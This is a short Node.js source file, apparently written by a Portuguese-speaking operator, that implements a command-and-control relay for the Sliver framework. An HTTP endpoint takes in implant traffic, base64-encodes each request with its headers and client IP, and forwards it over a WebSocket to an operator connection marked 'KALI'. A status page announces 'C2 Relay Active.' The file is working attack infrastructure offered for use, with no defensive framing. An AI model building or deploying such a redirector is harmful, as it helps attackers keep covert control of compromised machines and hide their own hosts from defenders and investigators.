const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI_WS = null;

const server = http.createServer((req, res) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toLocaleTimeString();

    // 1. Dashboard Visual
    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end(`<h1>C2 Relay Active</h1><p>Status: Monitoring...</p><p>IP: ${clientIp}</p>`);
        return;
    }

    // 2. Encaminhamento de Tráfego do Sliver
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
        const payload = Buffer.concat(body).toString('base64');
        
        console.log(`[${timestamp}] REQUISICAO: ${req.method} de ${clientIp}`);

        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
            KALI_WS.send(JSON.stringify({
                type: 'SLIVER_TRAFFIC',
                path: req.url,
                method: req.method,
                ip: clientIp,
                headers: req.headers,
                data: payload
            }));
            res.writeHead(200);
            res.end();
        } else {
            res.writeHead(503);
            res.end("Bridge Offline");
        }
    });
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI_WS = ws;
        console.log(`\n[!] CONEXAO MESTRE: Operador KALI estabelecido.\n`);
    }
});

server.listen(PORT, () => console.log(`Redirecionador Profissional Ativo na porta ${PORT}`));
